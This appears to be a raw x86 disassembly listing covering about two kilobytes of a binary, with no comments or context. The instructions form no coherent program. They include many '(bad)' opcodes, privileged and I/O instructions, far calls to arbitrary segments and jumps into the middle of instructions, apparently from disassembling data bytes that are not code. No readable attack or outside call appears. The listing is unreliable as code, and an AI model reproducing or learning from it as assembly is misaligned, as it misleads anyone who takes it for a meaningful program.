  4102d1:	test   al,0xde
  4102d3:	dec    edx
  4102d4:	add    BYTE PTR [ecx+0xe],cl
  4102d7:	jne    0x41032f
  4102d9:	xor    esp,esi
  4102db:	pusha  
  4102dc:	mov    al,ds:0x7775fc1f
  4102e1:	daa    
  4102e2:	popa   
  4102e3:	scas   eax,DWORD PTR es:[edi]
  4102e4:	test   BYTE PTR [eax-0x2b87e839],0xe2
  4102eb:	das    
  4102ec:	arpl   WORD PTR [ecx],cx
  4102ee:	jbe    0x41027a
  4102f0:	ret    
  4102f1:	dec    edx
  4102f2:	sub    eax,0x981f8be6
  4102f7:	js     0x410286
  4102f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102fa:	shr    DWORD PTR [esi],cl
  4102fc:	dec    edx
  4102fd:	cmc    
  4102fe:	aad    0x7f
  410300:	sbb    eax,DWORD PTR [ecx]
  410302:	std    
  410303:	(bad)  
  410304:	test   DWORD PTR [esi+0x56b87be4],esi
  41030a:	adc    al,0xe1
  41030c:	outs   dx,DWORD PTR ds:[esi]
  41030d:	xor    eax,0x44f91cd
  410312:	push   es
  410313:	mov    ah,0x90
  410315:	mov    cl,0xc4
  410317:	mov    dh,0x7f
  410319:	and    ecx,esp
  41031b:	mov    esp,0xf6cadfd5
  410320:	jb     0x41031b
  410322:	sub    eax,0xb2879690
  410327:	add    eax,0x7519d631
  41032c:	mov    ah,0x70
  41032e:	xchg   ecx,eax
  41032f:	adc    eax,0xc4a43c7e
  410334:	jno    0x41037f
  410336:	outs   dx,BYTE PTR ds:[esi]
  410337:	jb     0x4102f7
  410339:	sahf   
  41033a:	aam    0x64
  41033c:	adc    esp,DWORD PTR [ecx]
  41033e:	mov    cl,0x93
  410340:	pop    edx
  410341:	xor    BYTE PTR [edi+edx*2-0x7],0x40
  410346:	or     edi,DWORD PTR [ecx]
  410348:	dec    ecx
  410349:	call   0x79b21911
  41034e:	jno    0x41033f
  410350:	scas   al,BYTE PTR es:[edi]
  410351:	fwait
  410352:	cmp    ebp,DWORD PTR [edx]
  410354:	jge    0x410367
  410356:	add    al,0x78
  410358:	add    al,0x3e
  41035a:	data16 fdiv st,st(1)
  41035d:	or     eax,0xdbb4555d
  410362:	cmp    DWORD PTR [eax-0x1b],eax
  410365:	cli    
  410366:	adc    BYTE PTR [ebx-0x5bad5f3c],bl
  41036c:	push   esp
  41036d:	cli    
  41036e:	dec    ebp
  41036f:	xchg   ebx,eax
  410370:	addr16 pusha 
  410372:	(bad)  
  410373:	xor    al,0xf9
  410375:	and    ch,BYTE PTR [edx-0x22bd6ddd]
  41037b:	xor    eax,0xe9e11549
  410380:	jno    0x4103d5
  410382:	repz push esp
  410384:	cmp    al,0x1b
  410386:	xor    al,0xb1
  410388:	xor    eax,0xef942c0e
  41038d:	xor    BYTE PTR [edi-0x3803580b],bl
  410393:	mov    ebp,0x62d6105d
  410398:	in     eax,dx
  410399:	cmc    
  41039a:	xchg   esi,eax
  41039b:	mov    ecx,0x7544ba2d
  4103a0:	xor    esi,0x4a
  4103a3:	bound  ebx,QWORD PTR [eax+0x1e]
  4103a6:	add    al,0x94
  4103a8:	scas   eax,DWORD PTR es:[edi]
  4103a9:	stos   BYTE PTR es:[edi],al
  4103aa:	and    BYTE PTR [ebp-0x49],dh
  4103ad:	rcl    esp,cl
  4103af:	lahf   
  4103b0:	out    dx,al
  4103b1:	test   ebx,esp
  4103b3:	je     0x4103c8
  4103b5:	lock pop ds
  4103b7:	push   edx
  4103b8:	sbb    DWORD PTR [eax],esi
  4103ba:	inc    esi
  4103bb:	scas   eax,DWORD PTR es:[edi]
  4103bc:	jno    0x4103cb
  4103be:	push   esp
  4103bf:	inc    edx
  4103c0:	fcmove st,st(1)
  4103c2:	sbb    eax,0xc95c3778
  4103c7:	sub    dh,cl
  4103c9:	mov    eax,0x557ce979
  4103ce:	and    DWORD PTR [eax+0x71],edx
  4103d1:	rcr    DWORD PTR [ebp+0x5b],1
  4103d4:	fld    DWORD PTR [eax]
  4103d6:	sbb    al,0xbc
  4103d8:	lods   al,BYTE PTR ds:[esi]
  4103d9:	xor    al,al
  4103db:	mov    fs,WORD PTR [ecx+0x6bda4c1f]
  4103e1:	fsubr  st(1),st
  4103e3:	in     al,dx
  4103e4:	in     al,dx
  4103e5:	push   edi
  4103e6:	adc    bl,al
  4103e8:	retf   0x16dd
  4103eb:	jne    0x410430
  4103ed:	test   dh,0xc0
  4103f0:	push   ds
  4103f1:	dec    ebx
  4103f2:	push   ecx
  4103f3:	xchg   DWORD PTR [ebx+eax*4-0x3b608ad0],edx
  4103fa:	pop    eax
  4103fb:	out    dx,al
  4103fc:	sub    al,dl
  4103fe:	in     al,0x31
  410400:	cmp    edi,DWORD PTR [esi+0x24]
  410403:	adc    eax,0x9912be7d
  410408:	xchg   edx,eax
  410409:	pop    ds
  41040a:	xchg   ebx,eax
  41040b:	sbb    cl,BYTE PTR [ecx+0x76]
  41040e:	jne    0x41046f
  410410:	push   ds
  410411:	add    DWORD PTR [eax+0x5d],0xe4c2205d
  410418:	sahf   
  410419:	fwait
  41041a:	and    esp,ebp
  41041c:	test   DWORD PTR [edi],ebx
  41041e:	mov    cl,0xf5
  410420:	sub    ch,BYTE PTR [eax-0x4d68326a]
  410426:	aad    0x89
  410428:	jg     0x410442
  41042a:	cmc    
  41042b:	mov    dh,0x22
  41042d:	pop    ebp
  41042e:	cmc    
  41042f:	jnp    0x4103d7
  410431:	(bad)  
  410432:	shl    DWORD PTR [ecx+0xd],cl
  410435:	nop
  410436:	or     eax,0xd56fcec3
  41043b:	mov    ecx,ebx
  41043d:	dec    esi
  41043e:	mov    ss,WORD PTR [ecx+0x50]
  410441:	xor    ch,BYTE PTR [edx-0x6e]
  410444:	or     bh,BYTE PTR cs:[ecx+0x554620fe]
  41044b:	mov    ds:0x78b9b63d,al
  410451:	imul   esp,DWORD PTR [ebp-0x23],0x36
  410455:	or     esp,esi
  410457:	mov    ds:0x751b76a7,al
  41045c:	jecxz  0x410447
  41045e:	ds pop eax
  410460:	add    cl,BYTE PTR [edi-0x257f0772]
  410466:	out    0xe5,al
  410468:	std    
  410469:	lahf   
  41046a:	(bad)  
  41046b:	pop    edx
  41046c:	xchg   ebp,eax
  41046d:	clc    
  41046e:	das    
  41046f:	ins    DWORD PTR es:[edi],dx
  410470:	xor    DWORD PTR [eax],esp
  410472:	add    al,0xd1
  410474:	xor    eax,0xb5902f1e
  410479:	pop    esp
  41047a:	aad    0xed
  41047c:	mov    edx,0x277f3b6
  410481:	mov    bl,0xcd
  410483:	jne    0x41046b
  410485:	call   0xfb22:0x7239589a
  41048c:	js     0x41043c
  41048e:	mov    dl,0x18
  410490:	out    dx,eax
  410491:	jmp    0x7751:0x1cd59445
  410498:	shl    DWORD PTR [eax+0x61],0x64
  41049c:	and    cl,BYTE PTR [edx-0x4b]
  41049f:	idiv   BYTE PTR [si]
  4104a2:	repnz mov ds:0x8515f9ce,eax
  4104a8:	sbb    DWORD PTR [ebx+0x2b],edi
  4104ab:	adc    al,0xd0
  4104ad:	sub    dh,bh
  4104af:	inc    ebx
  4104b0:	ins    DWORD PTR es:[edi],dx
  4104b1:	and    DWORD PTR [ebp-0x79],edx
  4104b4:	pusha  
  4104b5:	fimul  WORD PTR [esi]
  4104b7:	arpl   WORD PTR [esp+ebp*8+0x1],di
  4104bb:	out    dx,eax
  4104bc:	test   eax,0xc0ff609f
  4104c1:	call   0xc57f:0x151b7826
  4104c8:	inc    ecx
  4104c9:	imul   eax,DWORD PTR [esi-0x3df04a98],0xffffffc3
  4104d0:	je     0x4104d2
  4104d2:	je     0x4104f9
  4104d4:	sub    al,0x82
  4104d6:	popa   
  4104d7:	sbb    eax,0xb43c349e
  4104dc:	cmp    al,ah
  4104de:	push   ebp
  4104df:	cdq    
  4104e0:	add    BYTE PTR [edx],al
  4104e2:	call   0x8323:0x1194d555
  4104e9:	pop    ds
  4104ea:	xchg   BYTE PTR [ebp-0x11d9ab9b],ah
  4104f0:	les    ebx,FWORD PTR [edi]
  4104f2:	cmp    eax,DWORD PTR [ecx-0x475a929c]
  4104f8:	add    al,0xa1
  4104fa:	aad    0x13
  4104fc:	xor    al,0x24
  4104fe:	mov    al,0x8a
  410500:	ja     0x4104c8
  410502:	(bad)  
  410503:	jne    0x410505
  410505:	mov    WORD PTR [ebx+0x7276a28],?
  41050b:	jmp    FWORD PTR [ebp+0x74]
  41050e:	(bad)  
  41050f:	and    DWORD PTR [edi-0x24a155fa],ebx
  410515:	(bad)  
  410516:	into   
  410517:	icebp  
  410518:	mov    eax,ds:0x7c759fc7
  41051d:	repnz push es
  41051f:	sbb    al,0xfb
  410521:	jno    0x4104be
  410523:	jl     0x410596
  410525:	mov    esi,0x6d355b15
  41052a:	mov    al,ds:0x1e2128b4
  41052f:	jns    0x410507
  410531:	mov    eax,ebx
  410533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410534:	imul   ecx,DWORD PTR [eax],0xffffff81
  410537:	jmp    0x4105b1
  410539:	(bad)  
  41053a:	ds dec esi
  41053c:	mov    ebx,es
  41053e:	jne    0x410508
  410540:	dec    ecx
  410541:	pusha  
  410542:	je     0x410531
  410544:	jae    0x4105c1
  410546:	jmp    0x18de769a
  41054b:	cmp    ah,BYTE PTR [edi]
  41054d:	push   edx
  41054e:	cmp    eax,0x3bb89537
  410553:	jbe    0x4105c6
  410555:	scas   al,BYTE PTR es:[edi]
  410556:	xchg   ebp,eax
  410557:	popa   
  410558:	sbb    dh,BYTE PTR [edx+0x50be8492]
  41055e:	lahf   
  41055f:	push   esi
  410560:	outs   dx,BYTE PTR ds:[esi]
  410561:	and    BYTE PTR [eax+0x34f7ca77],cl
  410567:	jb     0x4105da
  410569:	sbb    DWORD PTR [eax+0xe],esp
  41056c:	cmc    
  41056d:	je     0x4104ff
  41056f:	lods   al,BYTE PTR ds:[esi]
  410570:	leave  
  410571:	pop    ds
  410572:	stos   BYTE PTR es:[edi],al
  410573:	mov    cl,bl
  410575:	call   0x64dc:0xcf1c13e4
  41057c:	cmp    bl,BYTE PTR [ecx-0x5a]
  41057f:	mov    ebx,0x26b1c2c1
  410584:	in     al,0x1f
  410586:	mov    ch,0xd2
  410588:	jge    0x4105ab
  41058a:	mov    dl,0x6c
  41058c:	sahf   
  41058d:	push   eax
  41058e:	loopne 0x4105b4
  410590:	ja     0x4105e5
  410592:	or     dh,BYTE PTR [ebp+0x10]
  410595:	sbb    bh,BYTE PTR [eax+0x371fe432]
  41059b:	stc    
  41059c:	pop    esi
  41059d:	add    ebx,DWORD PTR [esi]
  41059f:	sar    DWORD PTR [ebp-0x1a],cl
  4105a2:	icebp  
  4105a3:	pushf  
  4105a4:	jo     0x410602
  4105a6:	mov    al,ds:0x3ea0283e
  4105ab:	xchg   esp,eax
  4105ac:	stc    
  4105ad:	mov    DWORD PTR [edx],esp
  4105af:	jne    0x4105a3
  4105b1:	mov    edi,0x994335be
  4105b6:	imul   ebp,DWORD PTR [edi],0x97179471
  4105bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105bd:	xor    al,0x1c
  4105bf:	pop    ss
  4105c0:	jmp    0x4105e4
  4105c2:	mov    ch,0x20
  4105c4:	out    dx,al
  4105c5:	setae  BYTE PTR [edi+0x9]
  4105c9:	dec    edx
  4105ca:	or     al,0xa0
  4105cc:	jno    0x41058a
  4105ce:	sahf   
  4105cf:	je     0x410617
  4105d1:	add    al,0x91
  4105d3:	ror    eax,1
  4105d5:	pop    ds
  4105d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105d7:	call   0xc392:0xf4ea9ae
  4105de:	fldcw  WORD PTR [edi+0x4262dc3c]
  4105e4:	clc    
  4105e5:	std    
  4105e6:	cld    
  4105e7:	clc    
  4105e8:	add    ah,BYTE PTR [ebx-0x1]
  4105eb:	out    dx,al
  4105ec:	xor    eax,0x81753b52
  4105f1:	fmul   DWORD PTR ds:0x44e8aa9b
  4105f7:	arpl   WORD PTR [ecx-0x10],si
  4105fa:	stos   DWORD PTR es:[edi],eax
  4105fb:	mov    bh,0x34
  4105fd:	stc    
  4105fe:	push   ecx
  4105ff:	aaa    
  410600:	(bad)  
  410601:	and    BYTE PTR [ecx],ah
  410603:	jae    0x4105a1
  410605:	ins    BYTE PTR es:[edi],dx
  410606:	or     BYTE PTR [esi+0x3c410bc1],cl
  41060c:	jno    0x4105fd
  41060e:	inc    esp
  41060f:	mov    BYTE PTR [ebp+eax*1+0x3be9566a],dl
  410616:	inc    esi
  410617:	pop    esp
  410618:	fs loopne 0x410654
  41061b:	mov    ch,0xa0
  41061d:	push   esi
  41061e:	pop    DWORD PTR [ecx+0x78]
  410621:	rcl    BYTE PTR gs:[eax+0x131d1383],cl
  410628:	jno    0x410645
  41062a:	hlt    
  41062b:	xchg   esp,eax
  41062c:	cmp    DWORD PTR [eax],esp
  41062e:	sbb    al,0xa5
  410630:	std    
  410631:	jecxz  0x4105d6
  410633:	les    edi,FWORD PTR [edi+0x1e47da9e]
  410639:	jecxz  0x4106ae
  41063b:	je     0x4106af
  41063d:	repnz mov al,0x4e
  410640:	fisub  WORD PTR [ebx]
  410642:	cmc    
  410643:	xor    ch,ch
  410645:	pop    ds
  410646:	jecxz  0x4105e6
  410648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410649:	xchg   ecx,eax
  41064a:	sahf   
  41064b:	sahf   
  41064c:	jle    0x410611
  41064e:	aad    0x13
  410650:	int3   
  410651:	sbb    DWORD PTR [ecx-0x38cc0406],edi
  410657:	test   BYTE PTR [edx+0x511b328c],bh
  41065d:	retf   0x666f
  410660:	imul   edi,DWORD PTR [ebx-0x28],0x91209c05
  410667:	xchg   edi,eax
  410668:	mov    ecx,0x5e5ce9c8
  41066d:	jns    0x4106b4
  41066f:	adc    bh,BYTE PTR ds:0xde015c20
  410675:	jg     0x410674
  410677:	fisubr WORD PTR [edx-0x6c852a91]
  41067d:	in     al,dx
  41067e:	or     dh,bl
  410680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410681:	hlt    
  410682:	loope  0x410616
  410684:	push   ebp
  410685:	sub    dl,BYTE PTR [esi+0x75]
  410688:	sub    DWORD PTR [ebx+0x4],eax
  41068b:	mov    ds:0x43ed074b,eax
  410690:	cmp    edx,DWORD PTR [eax-0x321162b]
  410696:	cmp    ah,BYTE PTR ds:0x329026c9
  41069c:	jnp    0x410657
  41069e:	jb     0x4106e5
  4106a0:	aad    0xd4
  4106a2:	and    eax,0x2b5ec97d
  4106a7:	jne    0x4106ee
  4106a9:	adc    DWORD PTR [eax-0x3d],edi
  4106ac:	push   esi
  4106ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106ae:	push   eax
  4106af:	in     eax,dx
  4106b0:	ins    BYTE PTR es:[edi],dx
  4106b1:	and    BYTE PTR [ecx+edi*8-0x3f318839],dl
  4106b8:	je     0x410726
  4106ba:	aad    0xb0
  4106bc:	pop    ss
  4106bd:	mov    edi,0x7e08d48a
  4106c2:	aaa    
  4106c3:	jne    0x4106a4
  4106c5:	int    0xdf
  4106c7:	or     DWORD PTR [ebx-0x428a0e31],0x4e
  4106ce:	xor    DWORD PTR [ecx-0x684ca864],edx
  4106d4:	hlt    
  4106d5:	or     ch,BYTE PTR [eax+0x49]
  4106d8:	ins    BYTE PTR es:[edi],dx
  4106d9:	sbb    BYTE PTR [edx],bh
  4106db:	inc    ecx
  4106dc:	mov    eax,ds:0xfc15131f
  4106e1:	pushf  
  4106e2:	jmp    0xb6de:0xd8ef87f5
  4106e9:	jge    0x4106ec
  4106eb:	fadd   QWORD PTR ss:[edi]
  4106ee:	test   eax,0xbb1fdfd8
  4106f3:	and    eax,0x8250af1d
  4106f8:	loope  0x41074c
  4106fa:	aad    0x2a
  4106fc:	mov    ebp,0x51fe9c42
  410701:	jl     0x410727
  410703:	jne    0x41072f
  410705:	jecxz  0x4106a8
  410707:	js     0x41068f
  410709:	jecxz  0x410765
  41070b:	jecxz  0x41077e
  41070d:	or     BYTE PTR [ebx+0x45],cl
  410710:	sub    DWORD PTR [eax-0x6799c9ad],0xd29892b1
  41071a:	mov    esi,ebp
  41071c:	sbb    BYTE PTR [esi+0x9166760],ch
  410722:	xlat   BYTE PTR ds:[ebx]
  410723:	and    al,0x59
  410725:	mov    al,ds:0x4570f16c
  41072a:	scas   eax,DWORD PTR es:[edi]
  41072b:	add    esi,DWORD PTR [ecx+eiz*8]
  41072e:	fidivr DWORD PTR [ebx]
  410730:	xor    cl,0x35
  410733:	inc    eax
  410734:	mov    ch,0x2e
  410736:	(bad)  
  410737:	mov    ds:0x35d598b6,eax
  41073c:	sbb    eax,0x78b034e8
  410741:	cld    
  410742:	and    DWORD PTR [edi],ebp
  410744:	add    BYTE PTR [ebx+0x43b84f25],dl
  41074a:	and    dh,BYTE PTR [ebp-0x47]
  41074d:	mul    BYTE PTR [edi]
  41074f:	shl    BYTE PTR [edx+0x71bab328],1
  410755:	nop
  410756:	push   esi
  410757:	and    eax,0x4ee315fa
  41075c:	loope  0x4106f1
  41075e:	sbb    BYTE PTR [eax-0x4b],bh
  410761:	loopne 0x410728
  410763:	cs push 0x40e1a54a
  410769:	scas   al,BYTE PTR es:[edi]
  41076a:	(bad)  
  41076b:	ffree  st(1)
  41076d:	in     eax,dx
  41076e:	cmp    BYTE PTR [ebp+0x15b8c9b3],dh
  410774:	dec    eax
  410775:	icebp  
  410776:	jle    0x410766
  410778:	adc    eax,0x724d7358
  41077d:	cli    
  41077e:	add    DWORD PTR [ebx+0x6d0ce636],eax
  410784:	lea    ebp,[edx*8-0x2d0f78ea]
  41078b:	xchg   esi,eax
  41078c:	cmp    al,0x93
  41078e:	push   ebx
  41078f:	lods   eax,DWORD PTR ds:[esi]
  410790:	adc    eax,0xbb9455ab
  410795:	aam    0x99
  410797:	jno    0x4107f4
  410799:	repz aad 0x8e
  41079c:	xchg   ch,dl
  41079e:	fistp  QWORD PTR [edi+0x75ca0032]
  4107a4:	cmp    al,al
  4107a6:	imul   ebp,DWORD PTR [eax],0xdad898dc
  4107ac:	js     0x41073b
  4107ae:	(bad)  
  4107af:	sahf   
  4107b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107b1:	rol    DWORD PTR [ebp+0x57],0xab
  4107b5:	imul   ebp,DWORD PTR [edi-0x54cbd580],0x22c2f1a2
  4107bf:	fidivr WORD PTR [ecx]
  4107c1:	adc    dl,dh
  4107c3:	inc    edx
  4107c4:	jl     0x410842
  4107c6:	and    al,0xf2
  4107c8:	std    
  4107c9:	les    ecx,FWORD PTR [esi-0x2adbbf2f]
  4107cf:	or     al,0xc6
  4107d1:	(bad)  
  4107d2:	into   
  4107d3:	push   ebp
  4107d4:	sbb    eax,0x9cb6d5b2
  4107d9:	out    0xd7,al
  4107db:	or     DWORD PTR [ebx+esi*1+0x51],0xc6a4a675
  4107e3:	inc    esp
  4107e4:	shr    ah,1
  4107e6:	std    
  4107e7:	push   eax
  4107e8:	jnp    0x410824
  4107ea:	ja     0x4107a9
  4107ec:	and    ebx,DWORD PTR [ecx]
  4107ee:	in     eax,0x7a
  4107f0:	add    eax,0x36cb9503
  4107f5:	enter  0x4257,0x3f
  4107f9:	lahf   
  4107fa:	add    dh,BYTE PTR [ebx+0x6bf43b3b]
  410800:	rcr    al,cl
  410802:	je     0x41083f
  410804:	adc    DWORD PTR [ebp-0x1fbd0ce9],esp
  41080a:	js     0x41081b
  41080c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41080d:	jge    0x4107e4
  41080f:	cmp    BYTE PTR [ecx-0x7340ae0b],dl
  410815:	add    eax,0x842875b8
  41081a:	add    dl,BYTE PTR [eax-0x1e]
  41081d:	xchg   edx,eax
  41081e:	adc    ebp,ebx
  410820:	jb     0x410858
  410822:	add    BYTE PTR [esi],ah
  410824:	xchg   edx,eax
  410825:	out    dx,eax
  410826:	sub    bl,BYTE PTR [ebp+0x7530ea51]
  41082c:	repz out dx,al
  41082e:	fcomi  st,st(7)
  410830:	jb     0x410825
  410832:	sbb    eax,0xe6118ee0
  410837:	xchg   edx,eax
  410838:	jno    0x4107ec
  41083a:	adc    al,0x9c
  41083c:	xchg   ebp,eax
  41083d:	es push ds
  41083f:	lods   eax,DWORD PTR ds:[esi]
  410840:	or     DWORD PTR [esi],esi
  410842:	aad    0x46
  410844:	jg     0x410811
  410846:	and    eax,0x510b9b7f
  41084b:	mov    edx,0x4fb21a87
  410850:	jb     0x41087e
  410852:	jge    0x410858
  410854:	push   ds
  410855:	ret    
  410856:	shr    DWORD PTR [esi],0x16
  410859:	aaa    
  41085a:	dec    esi
  41085b:	mov    ds:0xb56202b,eax
  410860:	mov    ebx,0xada82ee6
  410865:	dec    esp
  410866:	dec    ecx
  410867:	cmc    
  410868:	cli    
  410869:	mov    edi,0x4b3f2a0c
  41086e:	dec    eax
  41086f:	jne    0x4108be
  410871:	sub    ebp,DWORD PTR [ebp*8+0x77b3f660]
  410878:	jno    0x4108de
  41087a:	mov    ecx,0x87e6fabe
  41087f:	and    BYTE PTR ds:0x7484f120,bl
  410885:	cmp    DWORD PTR [ebx-0x29d31e10],edx
  41088b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41088c:	sbb    BYTE PTR [esi],cl
  41088e:	out    0x5f,eax
  410890:	pushf  
  410891:	stc    
  410892:	lds    ebx,FWORD PTR [esi+0x39c91fdc]
  410898:	rol    BYTE PTR [esi-0x36],0x21
  41089c:	(bad)  
  41089d:	cs call 0xd58fd8ea
  4108a3:	jecxz  0x410864
  4108a5:	sbb    al,0xc1
  4108a7:	sar    BYTE PTR [esi+edx*1],cl
  4108aa:	jecxz  0x410923
  4108ac:	and    BYTE PTR [ebp-0x20],bl
  4108af:	retf   0x4b7d
  4108b2:	popf   
  4108b3:	fdivr  QWORD PTR [edi+0x5f]
  4108b6:	aad    0x44
  4108b8:	mov    bl,0x8c
  4108ba:	xlat   BYTE PTR ds:[ebx]
  4108bb:	iret   
  4108bc:	jecxz  0x4108ea
  4108be:	pop    ebx
  4108bf:	jne    0x4108bf
  4108c1:	lea    edx,[edx-0x2c]
  4108c4:	sbb    eax,0xa954a247
  4108c9:	adc    bl,ch
  4108cb:	nop
  4108cc:	lea    esi,[ecx+0x55]
  4108cf:	retf   0xb18e
  4108d2:	push   eax
  4108d3:	fisub  DWORD PTR [ecx+0x20]
  4108d6:	jae    0x41088a
  4108d8:	mov    eax,ds:0x1fbb0b4b
  4108dd:	aas    
  4108de:	ror    BYTE PTR [ebp+0x30],cl
  4108e1:	repz add ebp,edi
  4108e4:	sbb    al,0xcc
  4108e6:	aad    0x4d
  4108e8:	loopne 0x4108fc
  4108ea:	out    0x0,eax
  4108ec:	sub    al,0x20
  4108ee:	jb     0x410930
  4108f0:	or     esp,DWORD PTR [edx-0x7cddd404]
  4108f6:	or     eax,0x539fb125
  4108fb:	in     eax,0xbe
  4108fd:	dec    eax
  4108fe:	jno    0x410916
  410900:	imul   esp,DWORD PTR [eax],0x1f
  410903:	call   0x9484:0x815933b7
  41090a:	aad    0x17
  41090c:	sub    DWORD PTR [esi-0x4e978561],0xd4cf93a7
  410916:	into   
  410917:	cmc    
  410918:	adc    BYTE PTR [esi-0x47],ah
  41091b:	xsave  [edx+0x75f935d5]
  410922:	bound  edi,QWORD PTR [ebp-0x5d]
  410925:	push   edx
  410926:	(bad)  
  410927:	jne    0x4108d9
  410929:	push   esp
  41092a:	popa   
  41092b:	call   0x31622e22
  410930:	lea    ebp,[esi+0x653190e2]
  410936:	ror    DWORD PTR [eax-0x5b],1
  410939:	pop    ecx
  41093a:	div    DWORD PTR [edx+edi*4-0x33]
  41093e:	sbb    esp,DWORD PTR [edx+0x3827e22e]
  410944:	jno    0x4108ea
  410946:	adc    DWORD PTR [ecx+0x19],eax
  410949:	jns    0x4108ef
  41094b:	sub    BYTE PTR [ebp+0x20],dh
  41094e:	xchg   ecx,eax
  41094f:	sub    ebx,DWORD PTR [edi-0x26f33396]
  410955:	adc    BYTE PTR ds:0xd5f43d41,dl
  41095b:	sbb    eax,0x6e438a92
  410960:	jae    0x410986
  410962:	(bad)  
  410964:	xchg   ebp,eax
  410965:	pop    ds
  410966:	inc    edx
  410967:	cmc    
  410968:	mov    ebx,0x4f4ab438
  41096d:	push   eax
  41096e:	aad    0xfe
  410970:	pop    ebx
  410971:	das    
  410972:	jl     0x410993
  410974:	mov    dl,0x21
  410976:	xor    esi,DWORD PTR [ebp+0x69]
  410979:	fbstp  TBYTE PTR ds:0x60efe82b
  41097f:	mov    ds:0x651ae571,al
  410984:	xchg   ebp,eax
  410985:	imul   eax,DWORD PTR [esi+0x720182d2],0x9cd22b75
  41098f:	or     BYTE PTR [eax+0x1],dl
  410992:	pusha  
  410993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410994:	jb     0x41097b
  410996:	je     0x41093e
  410998:	mov    edi,0x318756fc
  41099d:	loop   0x410968
  41099f:	repz mov dh,0x1f
  4109a2:	call   0xd5b5:0x9106617a
  4109a9:	icebp  
  4109aa:	aad    0x0
  4109ac:	sbb    cl,BYTE PTR [eax+0x4c]
  4109af:	jno    0x410970
  4109b1:	stos   BYTE PTR es:[edi],al
  4109b2:	push   esi
  4109b3:	jne    0x4109ee
  4109b5:	mov    ah,0xcf
  4109b7:	retf   0xa08
  4109ba:	hlt    
  4109bb:	mov    eax,ds:0x5bc04971
  4109c0:	ror    BYTE PTR [esi-0x6a],cl
  4109c3:	mov    eax,0x722c1fef
  4109c8:	repnz fcom st(4)
  4109cb:	and    cl,BYTE PTR [ecx+0xa82d5f6]
  4109d1:	mov    esp,0x741aa41
  4109d6:	data16 jne 0x4109c1
  4109d9:	rcl    DWORD PTR [edi],0x91
  4109dc:	mov    dh,0x69
  4109de:	sub    eax,0x8d6b7ff3
  4109e3:	xchg   edi,eax
  4109e4:	sbb    eax,edx
  4109e6:	lods   eax,DWORD PTR ds:[esi]
  4109e7:	pop    esp
  4109e8:	cmc    
  4109e9:	(bad)  
  4109ea:	jmp    0x410999
  4109ec:	mov    eax,0xb149ac1f
  4109f1:	jns    0x410a17
  4109f3:	scas   al,BYTE PTR es:[di]
  4109f5:	and    al,0x14
  4109f7:	ss cmp al,0x20
  4109fa:	mov    edx,0xfb0b6812
  4109ff:	mov    eax,0xafac3d7f
  410a04:	jo     0x410a66
  410a06:	xlat   BYTE PTR cs:[ebx]
  410a08:	out    0x9f,eax
  410a0a:	fild   WORD PTR [esi]
  410a0c:	js     0x410a07
  410a0e:	test   eax,0xc9b3e098
  410a13:	sub    al,0x31
  410a15:	push   0xafd17a2b
  410a1a:	pop    esp
  410a1b:	jne    0x4109f6
  410a1d:	in     al,dx
  410a1e:	and    al,0x6c
  410a20:	mov    ch,0x97
  410a22:	adc    al,0xbe
  410a24:	jno    0x410a0a
  410a26:	jae    0x410a51
  410a28:	sbb    eax,0x1ad16f28
  410a2d:	and    BYTE PTR [esi],al
  410a2f:	xchg   edx,eax
  410a30:	xchg   esi,eax
  410a31:	push   cs
  410a32:	loopne 0x410aa4
  410a34:	not    BYTE PTR [ebp-0x4e8e6231]
  410a3a:	add    ch,BYTE PTR [ecx+0x227588bf]
  410a40:	push   cs
  410a41:	jecxz  0x410a34
  410a43:	sub    bl,BYTE PTR [edx]
  410a45:	jecxz  0x4109f7
  410a47:	inc    edi
  410a48:	popa   
  410a49:	lock xor BYTE PTR [eax-0x7d16bf8f],0x89
  410a51:	lock mov al,0xcb
  410a54:	jl     0x410a75
  410a56:	xchg   ebx,eax
  410a57:	add    BYTE PTR [eax],ch
  410a59:	js     0x410a4f
  410a5b:	inc    ebx
  410a5c:	in     al,0xd4
  410a5e:	aad    0xa0
  410a60:	stc    
  410a61:	pushf  
  410a62:	leave  
  410a63:	mov    ah,0x46
  410a65:	cmp    edx,eax
  410a67:	push   ebp
  410a68:	outs   dx,BYTE PTR ds:[esi]
  410a69:	and    BYTE PTR [edx+0x2f],ch
  410a6c:	sub    eax,0x4e865e9f
  410a71:	lods   eax,DWORD PTR ds:[esi]
  410a72:	adc    esi,esi
  410a74:	(bad)  
  410a75:	pop    ds
  410a76:	adc    eax,0xc8d2bb2e
  410a7b:	rol    BYTE PTR [esi-0x568a306f],0x3a
  410a82:	pop    esi
  410a83:	das    
  410a84:	xor    eax,0x7159977a
  410a89:	and    BYTE PTR [ebx+ebp*4-0x55],0x8d
  410a8e:	add    BYTE PTR [ebx+0x13d71fc2],cl
  410a94:	fs xchg ebx,eax
  410a96:	fild   QWORD PTR [edi]
  410a98:	pop    edi
  410a99:	popf   
  410a9a:	aad    0x58
  410a9c:	lods   eax,DWORD PTR ds:[esi]
  410a9d:	loope  0x410a64
  410a9f:	sbb    cl,bl
  410aa1:	out    0xc2,eax
  410aa3:	js     0x410a99
  410aa5:	out    0x45,al
  410aa7:	pop    edx
  410aa8:	cmc    
  410aa9:	sar    BYTE PTR [ebp+0x31],cl
  410aac:	lahf   
  410aad:	ja     0x410a84
  410aaf:	mov    eax,ds:0x4a5fd569
  410ab4:	rcl    DWORD PTR [ebp-0x60],cl
  410ab7:	jne    0x410a7c
  410ab9:	lea    ebp,[eax+0x79]
  410abc:	mov    esp,DWORD PTR [edx-0x48]
  410abf:	sub    esi,DWORD PTR [ecx-0x3b]
  410ac2:	cmc    
  410ac3:	mov    edi,0xd784ecff
  410ac8:	imul   esp,DWORD PTR [eax],0x3ec32f3b
  410ace:	xlat   BYTE PTR ds:[ebx]
  410acf:	mov    ss,WORD PTR [ecx+edx*2-0x2b]
  410ad3:	dec    ecx
  410ad4:	pop    ebx
  410ad5:	push   ebx
